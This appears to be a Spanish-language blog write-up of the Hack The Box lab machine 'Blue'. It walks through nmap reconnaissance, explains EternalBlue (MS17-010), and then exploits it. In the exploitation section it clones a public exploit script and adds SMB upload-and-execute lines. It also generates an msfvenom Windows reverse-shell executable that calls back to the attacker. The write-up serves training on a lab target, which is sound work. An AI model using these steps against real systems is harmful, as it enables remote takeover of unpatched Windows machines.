@@ -1,0 +1,149 @@
+---
+title: Blue
+date: '2023-07-11'
+lastmod: '2023-08-05'
+tags: ['labs', 'HackTheBox']
+draft: false
+summary: 'Blue, aunque posiblemente sea la máquina más simple de Hack The Box, demuestra la gravedad del exploit EternalBlue, que se ha utilizado en múltiples ataques de criptominería y ransomware a gran escala desde que se filtró públicamente.'
+images: ['/static/images/htb/blue/blue.png']
+---
+
+![Portada](/static/images/htb/blue/blue.png)
+
+<br></br>
+
+<TOCInline toc={props.toc} exclude="Introduccion" />
+
+## RECONOCIMIENTO
+
+### Nmap
+
+Realizamos el escaneo de puertos, para esta ocasion desarolle un script al que llame [TurboScann](https://github.com/activePort/TurboScann),
+el cual me agiliza y automatiza el escaneo con nmap y me retorna el reporte en HTML,lo cual me permite tenerlo siempre abierto en el navegador, a la vista y sin tener que maniobrar la consola a cada rato para ver que servicios estaban abiertos y sus descripciones.
+
+![Nmap1](/static/images/htb/blue/scann.png)
+
+![Nmap2](/static/images/htb/blue/scann1.png)
+![Nmap2](/static/images/htb/blue/scann2.png)
+
+### Puertos abiertos
+
+| Puertos abiertos                                                                                                                                            | Servicio    | Version                                                 |
+| ----------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- | ------------------------------------------------------- |
+| **135/tcp** <br></br> **49152/tcp** <br></br> **49153/tcp** <br></br> **49154/tcp** <br></br> **49155/tcp** <br></br> **49156/tcp** <br></br> **49157/tcp** | msrpc       | Microsoft Windows RPC                                   |
+| **_139/tcp_**                                                                                                                                               | netbios-ssn | Microsoft Windows netbios-ssn                           |
+| **_445/tcp_**                                                                                                                                               | netbios-ssn | Windows 7 Professional 7601 Service Pack 1 microsoft-ds |
+
+## ENUMERACION
+
+### Puerto 445 - Windows 7 Professional 7601 Service Pack 1 microsoft-ds
+
+El puerto mas descriptivo en esta ocasion es el 445 y al poner en google **"Windows 7 Professional 7601 Service Pack 1 microsoft-ds"** nos salta enseguida
+la vulnerabilidad Eternal Blue.
+
+#### Eternal Blue
+
+La vulnerabilidad EternalBlue es una falla de seguridad que afecta al protocolo SMB en sistemas operativos Windows. Fue descubierta por la Agencia de Seguridad Nacional de Estados Unidos (NSA) y se hizo ampliamente conocida cuando un grupo llamado "The Shadow Brokers" filtró herramientas de hacking desarrolladas por la NSA, incluido el exploit EternalBlue, en abril de 2017.
+
+EternalBlue aprovecha una vulnerabilidad en la implementación del protocolo SMB en Windows, permitiendo la ejecución remota de código en sistemas vulnerables. El exploit aprovecha un desbordamiento de búfer en el manejo de las solicitudes SMBv1 para lograr su objetivo. Al enviar una solicitud especialmente diseñada al servicio SMB de un sistema vulnerable, el atacante puede desencadenar un desbordamiento de búfer y ejecutar código malicioso en el sistema objetivo.
+
+Una vez que un sistema ha sido comprometido mediante EternalBlue, el atacante puede tomar el control total del mismo, sin necesidad de autenticación. Esto significa que puede realizar acciones como la instalación de malware, robo de datos, propagación en la red y otros ataques maliciosos.
+
+## EXPLOTACION
+
+Para la maquina Blue, la explotacion es muy sencilla. Mediante una busqueda en google debemos conseguir los scripts,
+cambiar ciertas lineas del codigo, ejecutarlos y enseguida obtendremos el acceso a la maquina con los permisos del usuario privilegiado **nt authority\system**
+
+Al realizar la busqueda de como explotar la vulnerabilidad de EternalBlue, nos encontramos con un [repositorio en github](https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit), que tiene los scripts y el paso a paso de como realizarlo.
+
+Ejecutamos un git clone y la url del repo para descargarlo.
+
+```shell
+git clone https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit.git
+```
+
+Instalamos un entorno virtual python2 ya que no funcionará sin él.  
+Un entorno virtual es una herramienta que te permite crear y gestionar entornos aislados para desarrollar y ejecutar proyectos, proporciona un espacio independiente donde puedes instalar paquetes y dependencias específicas para un proyecto en particular, sin afectar el entorno de Python global de tu sistema.Cuando trabajas en un proyecto de Python, es posible que necesites utilizar diferentes versiones de paquetes o incluso paquetes diferentes en proyectos diferentes. En lugar de instalar todas las dependencias en el entorno global de Python, puedes crear un entorno virtual separado para cada proyecto y mantener las dependencias específicas de ese proyecto en su propio entorno.
+
+```shell
+  apt-get install python3-virtualenv && virtualenv -p python2 venv && . venv/bin/activate
+```
+
+Estas líneas de código realizan varias acciones:
+
+- `apt-get install python3-virtualenv`: Esta línea de código instala el paquete **_python3-virtualenv_** utilizando el gestor de paquetes **_apt-get_**.  
+  **_python3-virtualenv_** es una herramienta que te permite crear y gestionar entornos virtuales en Python 3.
+
+- `virtualenv -p python2 venv`: Esta línea de código crea un nuevo entorno virtual llamado "venv" utilizando la herramienta **_virtualenv_**.  
+  El argumento **_-p python2_** indica que se debe utilizar Python 2 como intérprete dentro del entorno virtual.
+
+- `. venv/bin/activate`: Esta línea de código activa el entorno virtual recién creado. Al ejecutar esta línea, se ajustan las variables de entorno para que el intérprete de Python y los comandos relacionados (como **_pip_**) apunten al entorno virtual en lugar del entorno global del sistema. Esto te permite trabajar dentro del entorno virtual de manera aislada y utilizar las versiones específicas de Python y paquetes instalados en ese entorno.
+
+Después de ejecutar estas líneas de código, estarás dentro del entorno virtual "venv" y podrás instalar paquetes y ejecutar tu código utilizando Python 2 dentro de ese entorno. Puedes reconocer que estás en el entorno virtual debido al cambio en el indicador de la línea de comandos, que generalmente se mostrará como `(venv)`.
+
+A continuacion debemos de cambiar unas lineas de codigo de el script **_42315.py_**.
+Como username, debemos poner `guest`.
+
+![Guest](/static/images/htb/blue/script.png)
+
+El uso del username "guest" está relacionado con la forma en que se explota una vulnerabilidad específica en el protocolo SMB (Server Message Block) en sistemas Windows.
+
+El exploit EternalBlue aprovecha una vulnerabilidad específica en el protocolo SMBv1 (Server Message Block) en sistemas Windows. Esta vulnerabilidad es conocida como MS17-010.
+
+En algunos sistemas, la cuenta de invitado (guest) puede tener privilegios limitados y no requerir autenticación para acceder a recursos compartidos de red. El exploit EternalBlue se aprovecha de esta característica, utilizando la cuenta de invitado (guest) para acceder a un recurso compartido vulnerable a través del protocolo SMB sin requerir autenticación adicional.
+
+Al utilizar "guest" como nombre de usuario en el script de EternalBlue, se intenta explotar esta vulnerabilidad en sistemas que tienen el acceso de invitado habilitado y no han aplicado los parches de seguridad correspondientes.
+
+Luego, mas abajo, debemos agregar las siguientes lineas.
+
+```js
+  smb_send_file(smbConn, '/path_to_your_reverse_shell/eternal-blue.exe', 'C', '/eternal-blue.exe')
+  service_exec(conn, r'cmd /c c:\eternal-blue.exe')
+```
+
+- `smb_send_file(smbConn, '/path_to_your_reverse_shell/eternal-blue.exe', 'C', '/eternal-blue.exe')`: Esta línea de código parece envia un archivo llamado "eternal-blue.exe" desde la ruta especificada **_('/path_to_your_reverse_shell/eternal-blue.exe')_** a la maquina victima a través de una conexión SMB (Server Message Block) establecida previamente (smbConn). El archivo se coloca en el directorio 'C' con el nombre '/eternal-blue.exe' en el sistema objetivo.
+
+- `service_exec(conn, r'cmd /c c:\eternal-blue.exe')`: Esta línea de código ejecuta el archivo "eternal-blue.exe" en la maquina victima utilizando el comando cmd /c. Esto implica ejecutar un shell de comando y ejecutar el archivo "eternal-blue.exe" ubicado en la ruta 'c:\eternal-blue.exe'.
+
+![Guest](/static/images/htb/blue/script1.png)
+
+Ahora, creamos una reverse shell con msfvenom.
+
+```js
+  msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.10.40 LPORT=1234 > eternal-blue.exe
+```
+
+![Msfvenom](/static/images/htb/blue/msfvenom.png)
+
+Estas líneas de comando utilizan la herramienta msfvenom de Metasploit Framework para generar un payload o carga útil en forma de un archivo ejecutable (.exe). El payload se configura para establecer una conexión de shell inverso TCP en sistemas Windows.
+
+- `msfvenom`: Es una herramienta de Metasploit Framework que se utiliza para generar payloads personalizados.
+- `p windows/shell_reverse_tcp`: Especifica el tipo de payload que se generará, en este caso, un shell inverso TCP para sistemas Windows.
+- `f exe`: Indica el formato de salida del payload, en este caso, un archivo ejecutable (.exe).
+- `LHOST=10.10.10.40`: Define la dirección IP local o la dirección IP del atacante donde se establecerá la conexión inversa.
+- `LPORT=1234`: Especifica el número de puerto local donde el atacante estará escuchando para establecer la conexión inversa.
+- `eternal-blue.exe`: Redirige la salida del payload generado a un archivo llamado "eternal-blue.exe".
+
+![Payload](/static/images/htb/blue/payload.png)
+
+Ejecutamos el script con python e indicandole la ip de la maquina victima, el cual explotara la vulnerabilidad, utilizara el eternal-blue.exe y nos devolvera una shell inversa a la maquina atacante.
+
+![ScriptProblem](/static/images/htb/blue/scriptproblem.png)
+
+Si nos da este error, lo unico que debemos hacer es instalar impacket.
+
+```shell
+  pip2 install impacket
+```
+
+![Impacket](/static/images/htb/blue/impacket.png)
+
+Y ahora si, ponemos el puerto 1234 en escucha, ejecutamos el script en python y tenemos acceso a la maquina victima
+con privilegios maximos.
+
+![Pwned](/static/images/htb/blue/pwned.png)
+
+Obtenemos la flag user.txt y root.txt.
+![User](/static/images/htb/blue/user.png)
+
+![Root](/static/images/htb/blue/root.png)
